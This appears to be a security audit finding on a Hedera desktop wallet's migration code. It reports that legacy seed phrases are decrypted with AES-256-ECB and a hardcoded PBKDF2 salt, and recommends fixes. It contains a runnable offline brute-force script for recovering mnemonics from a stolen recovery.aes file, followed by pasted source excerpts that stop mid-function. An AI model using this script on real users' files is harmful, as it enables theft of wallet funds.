### Title
AES-256-ECB with Hardcoded Static Salt Used to Decrypt Legacy Mnemonic Seed Phrase

### Summary
The `decryptLegacyMnemonic` function in `front-end/src/main/services/localUser/dataMigration.ts` decrypts the user's mnemonic seed phrase using AES-256-ECB mode — a cipher mode with no IV, no authentication, and deterministic output — combined with a hardcoded static salt for key derivation. This is a direct analog of the reported AES-CBC weakness, and is in fact more severe: ECB is universally considered broken for encrypting structured data. If an attacker obtains the `recovery.aes` file (via malware, cloud backup exposure, or backup theft), the weak encryption makes offline brute-force recovery of the seed phrase significantly more feasible, leading to full wallet compromise.

### Finding Description

**Root cause — `decryptLegacyMnemonic`:**

```
front-end/src/main/services/localUser/dataMigration.ts, lines 99–119
``` [1](#0-0) 

Two compounding weaknesses exist side-by-side:

**1. Hardcoded static salt (line 108):**
```ts
const salt = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8]);
```
The PBKDF2 key derivation uses a fixed, 8-byte, all-known salt. This means the derived key is entirely determined by the password alone. An attacker can pre-compute a dictionary of `PBKDF2(candidate_password, [1,2,3,4,5,6,7,8], 65536, 32, sha256)` values offline, without ever touching the target system. [2](#0-1) 

**2. AES-256-ECB mode (line 113):**
```ts
const decipher = crypto.createDecipheriv('aes-256-ecb', key, null);
```
ECB mode has no IV (the `null` third argument confirms this), no authentication tag, and is fully deterministic. Identical 16-byte plaintext blocks produce identical ciphertext blocks. There is no integrity check — a tampered ciphertext will silently produce garbage output rather than raising an error. [3](#0-2) 

**Trigger path:**

`decryptMigrationMnemonic` (line 163) reads `user.properties`, checks for `legacy=true`, and if set, calls `decryptLegacyMnemonic` with the path to `recovery.aes`. [4](#0-3) 

This is a reachable, user-triggered code path (data migration flow), not dead code.

**Contrast with the secure path:**

The non-legacy `decryptMnemonic` (line 121) correctly uses AES-256-GCM with a random IV, an auth tag, and Argon2id key derivation with a per-user salt extracted from the token. [5](#0-4) 

The main crypto utility also correctly uses AES-256-GCM throughout. [6](#0-5) 

### Impact Explanation

The `recovery.aes` file contains the user's BIP-39 mnemonic seed phrase, which is the root secret for all Hedera private keys derived from it. Recovering this phrase gives an attacker complete, irrevocable control over all associated Hedera accounts and assets.

The combination of ECB mode + static salt means:
- **No per-file randomness**: every user who uses the same password produces the same derived key and the same ciphertext for the same plaintext blocks.
- **Pre-computable attack**: an attacker can build a rainbow table of `PBKDF2(password, static_salt)` → `AES-ECB-decrypt(ciphertext)` mappings offline, then apply it to any stolen `recovery.aes` file.
- **No integrity check**: a tampered file cannot be detected; the decryption will silently succeed with corrupted output.

**Impact category**: Direct theft of user assets via seed phrase recovery.

### Likelihood Explanation

The attacker must obtain the `recovery.aes` file. This does not require physical access — it can be achieved via:
- Malware or RAT on the user's machine (common threat for desktop crypto wallets)
- Cloud backup or sync service exposure (e.g., iCloud Drive, Google Drive, OneDrive automatically syncing the Documents folder)
- Compromised backup media

Once the file is obtained, the attack is entirely offline. The static salt eliminates the per-user cost of building a dictionary; a single pre-computed table applies to all legacy users. PBKDF2-SHA256 with 65,536 iterations is also GPU-acceleratable, making brute-force of common passwords practical.

**Likelihood**: Medium — file exfiltration is a standard capability of commodity malware targeting crypto wallets; the static salt and ECB mode remove all per-user cryptographic protection.

### Recommendation

1. **Replace AES-ECB with AES-GCM** for any re-encryption of legacy data during migration. Since `decryptLegacyMnemonic` is a one-time migration path, the decrypted mnemonic should immediately be re-encrypted using the secure `encrypt()` utility (AES-256-GCM with random IV and auth tag) before being stored or used.

2. **Remove the hardcoded static salt**. If re-keying legacy data, generate a fresh random salt per user and store it alongside the ciphertext, as done in the non-legacy path.

3. **Do not persist the legacy-decrypted plaintext** — use it transiently and immediately re-encrypt with the modern scheme.

### Proof of Concept

**Setup**: Obtain a `recovery.aes` file from a user who migrated from the legacy tool (i.e., `user.properties` contains `legacy=true` and no CBC header in the file).

**Offline attack**:
```js
const crypto = require('crypto');

const staticSalt = Buffer.from([1, 2, 3, 4, 5, 6, 7, 8]);
const ciphertext = require('fs').readFileSync('recovery.aes');

for (const candidate of passwordDictionary) {
  const key = crypto.pbkdf2Sync(candidate, staticSalt, 65536, 32, 'sha256');
  try {
    const decipher = crypto.createDecipheriv('aes-256-ecb', key, null);
    const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    const text = plaintext.toString('utf-8');
    // BIP-39 mnemonics contain only known English words — validate easily
    if (isValidMnemonic(text)) {
      console.log('Recovered mnemonic:', text);
      break;
    }
  } catch {}
}
```

Because the salt is static and known, the same pre-computed `PBKDF2` table applies to every legacy user's file. A valid mnemonic is trivially detectable (known word list, fixed word count), providing an unambiguous success oracle with zero server interaction.

export async function decryptMnemonic(
  inputPath: string,
  token: string,
  password: string,
): Promise<string | null> {
  /* Read the encrypted data from the file */
  const data = await fs.promises.readFile(inputPath, { flag: 'r' });

  /* Get the salt from the token */
  const salt = getSalt(token);

  /* Generate the key from the password and the salt */
  const key = await generateArgon2id(password, salt);

  /* Get the header, auth tag, encrypted text, and IV from the data */
  const header = Buffer.from('AES|256|CBC|PKCS5Padding|', 'utf8');
  const authTag = data.subarray(data.length - AUTH_TAG_LENGTH);
  const encryptedText = data.subarray(header.length + IV_LENGTH, data.length - AUTH_TAG_LENGTH);
  const iv = data.subarray(header.length, header.length + IV_LENGTH);

  /* Create a decipher, set the auth tag */
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, new Uint8Array(iv));
  decipher.setAuthTag(new Uint8Array(authTag));

  try {
    /* Decrypt the encrypted text */
    const decrypted = Buffer.concat([decipher.update(encryptedText), decipher.final()]);
    return decrypted.toString('utf-8');
  } catch (error) {
    logger.error('Error decrypting mnemonic', { error });
    return null;
  }
}

export async function decryptMigrationMnemonic(password: string): Promise<string[] | null> {
  const content = await fs.promises.readFile(getPropertiesPath(), { encoding: 'utf-8', flag: 'r' });
  const parsedContent = parseUserProperties(content);

  const token = parsedContent.hash;
  if (!token) throw Error('No hash found at location');

  const isLegacy = parsedContent.legacy;

  let words: string | null;
  if (isLegacy) {
    words = await decryptLegacyMnemonic(getMnemonicPath(), password);
  } else {
    words = await decryptMnemonic(getMnemonicPath(), token, password);
  }

  if (words) return words.split(' ');

  return null;
}

export function encrypt(data: string, password: string) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(64);

  const key = deriveKey(password, salt);

  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  const encrypted = Buffer.concat([cipher.update(data, 'utf8'), cipher.final()]);

  const tag = cipher.getAuthTag();

  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64');
